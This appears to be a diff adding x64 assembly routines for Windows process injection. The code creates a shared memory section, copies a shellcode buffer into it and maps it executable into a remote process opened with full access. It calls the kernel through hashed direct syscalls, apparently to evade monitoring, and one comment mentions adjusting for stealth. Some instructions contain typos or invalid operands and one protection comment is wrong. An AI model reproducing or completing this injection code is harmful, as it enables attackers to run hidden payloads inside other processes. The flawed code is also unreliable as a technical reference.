@@ -128,5 +128,152 @@ _NtYieldExecution:
 done:
     mov rax,"error\n"
 
+;========================
+;========================
 
+create_shared_section:
+    
+    mov rbp,rsp ; save rsp this time rbp use as a normal register
+    sub rsp,0x1a0 
+    mov r11,rsp ;section handler variable
+    psuh 0x1000
+    mov r12,rsp ;Max Size varible
+    sub rsp,0x1a0
+    mov r13,rsp ;base adress
+    mov rsp,rbp ;restore rsp
+
+    lea rcx,r11 ; setting up Section HANDLE argument        
+
+    ; RDX = DesiredAccess
+    mov rdx, 0xF001F                    ; SECTION_ALL_ACCESS
+
+    ; R8 = ObjectAttributes = NULL
+    xor r8, r8                         
+
+    ; R9 = &MaximumSize (LARGE_INTEGER)
+    lea r9,r12          
+    
+    sub rsp, 0x28 + 0x20                ; Shadow space + alignment
+
+    mov qword [rsp+0x28], 0x04          ; PAGE_READWRITE
+    mov qword [rsp+0x30], 0x08000000    ; SEC_COMMIT
+
+    xor rax, rax
+    mov [rsp+0x38], rax                 ; FileHandle = NULL
+
+    mov r10,rcx
+    mov eax,0xB5578F84 ; NtCreateSection
+    call _syscallExtracter ;call derect syscall
+
+    add rsp, 0x28 + 0x20                ; Clean up the stack
+    ret
+
+map_view:
+    ; RCX = SectionHandle
+    mov rcx, r11
+
+    ; RDX = ProcessHandle (-1 = current process)
+    mov rdx, -1
+
+    ; R8 = &BaseAddress (OUT)
+    lea r8,r13
+
+    ; R9 = ZeroBits
+    xor r9, r9
+
+    sub rsp, 0x28 + 0x30
+
+    mov qword [rsp+0x28], 0                  ; CommitSize = 0
+    xor rax, rax
+    mov [rsp+0x30], rax                      ; SectionOffset = NULL
+    lea rax,r12
+    mov [rsp+0x38], rax                      ; ViewSize
+    mov qword [rsp+0x40], 2                  ; InheritDisposition = ViewUnmap
+    mov qword [rsp+0x48], 0                  ; AllocationType = 0
+    mov qword [rsp+0x50], 0x04               ; PAGE_READWRITE
+
+    mov r10,rcx
+    mov eax,0x8D1701C9 ; NtMapViewOfSection
+    call _syscallExtracter ;call derect syscall
+
+    add rsp, 0x28 + 0x30
+    ret
+
+mem_copy:
+    lea rsi, [rel myshellcode]
+    mov rcx, shellcode_size
+    mov rdi,r13     ; Mapped section destination
+    cld
+    rep movsb
+
+open_remote_process:
+    ; RCX = out HANDLE
+    lea rcx,[r11 - 0x08]
+
+    ; RDX = DesiredAccess
+    mov rdx, 0x1FFFFF                   ; PROCESS_ALL_ACCESS (for testing; adjust for stealth)
+
+    ; R8 = &ObjectAttributes
+    lea r8, [rel ObjectAttributes]
+
+    ; R9 = &ClientID
+    lea r9, [rel ClientID]
+
+    mov r10,rcx
+    mov eax,0x1060998A8 ; NtOpenProcess
+    call _syscallExtracter ;call derect syscall
+    ret
+
+
+map_view_remote:
+    ; RCX = SectionHandle
+    mov rcx,r11
+
+    ; RDX = ProcessHandle (-1 = current process)
+    lea rdx,[r11 - 0x08]
+
+    ; R8 = &BaseAddress (OUT)
+    lea r8,r13
+
+    ; R9 = ZeroBits
+    xor r9, r9
+
+    sub rsp, 0x28 + 0x30
+
+    mov qword [rsp+0x28], 0                  ; CommitSize = 0
+    xor rax, rax
+    mov [rsp+0x30], rax                      ; SectionOffset = NULL
+    lea rax,r12
+    mov [rsp+0x38], rax                      ; ViewSize
+    mov qword [rsp+0x40], 1                  ; InheritDisposition = ViewUnmap
+    mov qword [rsp+0x48], 0                  ; AllocationType = 0
+    mov qword [rsp+0x50], 0x40               ; PAGE_READWRITE
+
+    mov r10,rcx
+    mov eax,0x8D1701C9 ; NtMapViewOfSection
+    call _syscallExtracter ;call derect syscall
+
+    add rsp, 0x28 + 0x30
+    ret
+
+
+
+
+
+
+
+
+;RAW DATA
+;======================================
+ClientID:
+    dq 1234                             ; UniqueProcess = PID
+    dq 0                                ; UniqueThread = NULL
+
+ObjectAttributes:
+    dq 48                               ; Length = sizeof(OBJECT_ATTRIBUTES)
+    dq 0                                ; RootDirectory = NULL
+    dq 0                                ; ObjectName = NULL
+    dq 0                                ; Attributes = 0
+    dq 0                                ; SecurityDescriptor
+    dq 0                                ; SecurityQualityOfService
 
